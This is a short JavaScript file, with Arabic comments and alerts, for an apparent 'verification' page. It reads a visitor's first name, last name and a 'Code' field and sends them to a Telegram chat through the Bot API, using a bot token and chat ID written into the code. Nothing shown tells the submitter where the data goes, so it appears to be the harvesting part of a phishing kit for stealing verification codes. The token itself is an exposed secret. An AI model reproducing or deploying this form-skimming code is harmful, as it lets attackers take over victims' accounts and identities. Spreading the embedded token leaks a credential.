document.querySelector("button").addEventListener("click", function() {
    alert("Verification clicked!");
});

const botToken = "7719751525:AAG3Nlfn9obc5pjJGAuVUUbn8ZKjczhz0tw";  // استبدل هذا بالتوكن الفعلي الخاص بك
const chatId = "7696290146";  // استبدل هذا بمعرف الدردشة الفعلي الخاص بك

document.querySelector("button").addEventListener("click", function() {
    const firstName = document.querySelector("input[placeholder='First name']").value;
    const lastName = document.querySelector("input[placeholder='Last name']").value;
    const code = document.querySelector("input[placeholder='Code']").value;

    if (firstName && lastName && code) {
        const message = `New Submission:\nFirst Name: ${firstName}\nLast Name: ${lastName}\nCode: ${code}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("تم إرسال المعلومات إلى تيليغرام!");
            } else {
                alert("حدث خطأ أثناء الإرسال.");
            }
        })
        .catch(error => console.error("Error:", error));
    } else {
        alert("يرجى ملء جميع الحقول.");
    }
});
